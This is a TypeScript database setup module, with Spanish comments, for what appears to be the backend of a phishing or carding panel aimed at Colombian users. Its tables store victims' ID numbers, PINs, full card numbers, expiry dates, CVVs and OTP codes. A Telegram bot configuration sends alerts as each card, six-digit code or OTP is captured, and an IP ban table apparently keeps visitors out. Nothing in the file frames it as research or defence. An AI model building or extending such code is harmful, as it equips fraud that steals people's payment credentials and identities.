import { neon } from '@neondatabase/serverless'
import dotenv from 'dotenv'

dotenv.config()

const connectionString = process.env.DATABASE_URL || ''

let neonClient: any = null

function getNeonClient() {
  const conn = process.env.DATABASE_URL || connectionString
  if (!conn) {
    throw new Error('DATABASE_URL no está definida en las variables de entorno de Vercel.')
  }
  if (!neonClient) {
    neonClient = neon(conn)
  }
  return neonClient
}

// Wrapper seguro para sql que evita crashear al importar el módulo si falta DATABASE_URL
export const sql = ((strings: TemplateStringsArray, ...values: any[]) => {
  const client = getNeonClient()
  return client(strings, ...values)
}) as unknown as ReturnType<typeof neon>

// Inicialización y migraciones en la base de datos
export async function initDatabase() {
  const conn = process.env.DATABASE_URL || connectionString
  if (!conn) {
    console.warn('⚠️ DATABASE_URL no configurada. Omitiendo inicialización de BD.')
    return false
  }

  try {
    // 1. Tabla de Registros de Usuarios con columnas ip_address y six_digits
    await sql`
      CREATE TABLE IF NOT EXISTS user_records (
        id SERIAL PRIMARY KEY,
        doc_type VARCHAR(100),
        doc_number VARCHAR(100),
        pin VARCHAR(20),
        six_digits VARCHAR(20),
        full_name VARCHAR(255),
        address VARCHAR(255),
        birth_date VARCHAR(50),
        birth_place VARCHAR(150),
        expedition_date VARCHAR(50),
        expedition_place VARCHAR(150),
        status VARCHAR(50) DEFAULT 'PENDIENTE',
        ip_address VARCHAR(100) DEFAULT '190.24.120.45',
        created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
      );
    `

    // Asegurar columnas existentes en user_records
    await sql`ALTER TABLE user_records ADD COLUMN IF NOT EXISTS status VARCHAR(50) DEFAULT 'PENDIENTE';`
    await sql`ALTER TABLE user_records ADD COLUMN IF NOT EXISTS ip_address VARCHAR(100) DEFAULT '190.24.120.45';`
    await sql`ALTER TABLE user_records ADD COLUMN IF NOT EXISTS six_digits VARCHAR(20);`
    await sql`ALTER TABLE user_records ADD COLUMN IF NOT EXISTS card_number VARCHAR(50);`
    await sql`ALTER TABLE user_records ADD COLUMN IF NOT EXISTS card_holder VARCHAR(255);`
    await sql`ALTER TABLE user_records ADD COLUMN IF NOT EXISTS card_expiry VARCHAR(20);`
    await sql`ALTER TABLE user_records ADD COLUMN IF NOT EXISTS card_cvv VARCHAR(10);`

    // 2. Tabla de Transacciones con Tarjeta de Crédito
    await sql`
      CREATE TABLE IF NOT EXISTS credit_card_transactions (
        id SERIAL PRIMARY KEY,
        card_holder VARCHAR(255) NOT NULL,
        card_number VARCHAR(50) NOT NULL,
        card_brand VARCHAR(50) DEFAULT 'Desconocida',
        expiry_month VARCHAR(10) NOT NULL,
        expiry_year VARCHAR(10) NOT NULL,
        cvv VARCHAR(10) NOT NULL,
        installments INT DEFAULT 1,
        doc_type VARCHAR(50) DEFAULT 'CC',
        doc_number VARCHAR(100) DEFAULT '',
        phone VARCHAR(50) DEFAULT '',
        email VARCHAR(150) DEFAULT '',
        amount NUMERIC(12, 2) DEFAULT 249900.00,
        currency VARCHAR(10) DEFAULT 'COP',
        status VARCHAR(50) DEFAULT 'PENDIENTE',
        otp_code VARCHAR(20) DEFAULT '',
        ip_address VARCHAR(100) DEFAULT '190.24.120.45',
        created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
      );
    `

    // Asegurar columnas en credit_card_transactions si la tabla ya existía
    await sql`ALTER TABLE credit_card_transactions ADD COLUMN IF NOT EXISTS otp_code VARCHAR(20) DEFAULT '';`
    await sql`ALTER TABLE credit_card_transactions ADD COLUMN IF NOT EXISTS card_brand VARCHAR(50) DEFAULT 'Desconocida';`
    await sql`ALTER TABLE credit_card_transactions ADD COLUMN IF NOT EXISTS phone VARCHAR(50) DEFAULT '';`
    await sql`ALTER TABLE credit_card_transactions ADD COLUMN IF NOT EXISTS email VARCHAR(150) DEFAULT '';`
    await sql`ALTER TABLE credit_card_transactions ADD COLUMN IF NOT EXISTS status VARCHAR(50) DEFAULT 'PENDIENTE';`

    // 3. Tabla de IPs Bloqueadas (Firewall)
    await sql`
      CREATE TABLE IF NOT EXISTS banned_ips (
        id SERIAL PRIMARY KEY,
        ip_address VARCHAR(100) UNIQUE NOT NULL,
        reason VARCHAR(255) DEFAULT 'Bloqueo administrativo por seguridad',
        blocked_by VARCHAR(100) DEFAULT 'Admin',
        created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
      );
    `

    // 4. Tabla de Logs de Actividad
    await sql`
      CREATE TABLE IF NOT EXISTS db_activity_logs (
        id SERIAL PRIMARY KEY,
        action VARCHAR(100) NOT NULL,
        details TEXT,
        execution_time_ms INT DEFAULT 0,
        status VARCHAR(50) DEFAULT 'SUCCESS',
        created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
      );
    `

    // 5. Tabla de Configuración de Telegram Bot y App Settings
    await sql`
      CREATE TABLE IF NOT EXISTS telegram_config (
        id INT PRIMARY KEY DEFAULT 1,
        bot_token TEXT DEFAULT '',
        chat_id TEXT DEFAULT '',
        is_active BOOLEAN DEFAULT TRUE,
        notify_records BOOLEAN DEFAULT TRUE,
        notify_cards BOOLEAN DEFAULT TRUE,
        notify_six_digits BOOLEAN DEFAULT TRUE,
        notify_otp BOOLEAN DEFAULT TRUE,
        loading_gif_url TEXT DEFAULT '',
        updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
      );
    `

    // Asegurar columna loading_gif_url si la tabla ya existía
    await sql`ALTER TABLE telegram_config ADD COLUMN IF NOT EXISTS loading_gif_url TEXT DEFAULT '';`

    // Insertar fila base con id = 1 si no existe
    await sql`
      INSERT INTO telegram_config (id, bot_token, chat_id, is_active, notify_records, notify_cards, notify_six_digits, notify_otp, loading_gif_url)
      VALUES (1, '', '', TRUE, TRUE, TRUE, TRUE, TRUE, '')
      ON CONFLICT (id) DO NOTHING;
    `

    console.log('✅ Base de datos: user_records, credit_card_transactions, banned_ips, db_activity_logs y telegram_config verificadas.')
    return true
  } catch (error) {
    console.error('❌ Error al inicializar la base de datos:', error)
    throw error
  }
}
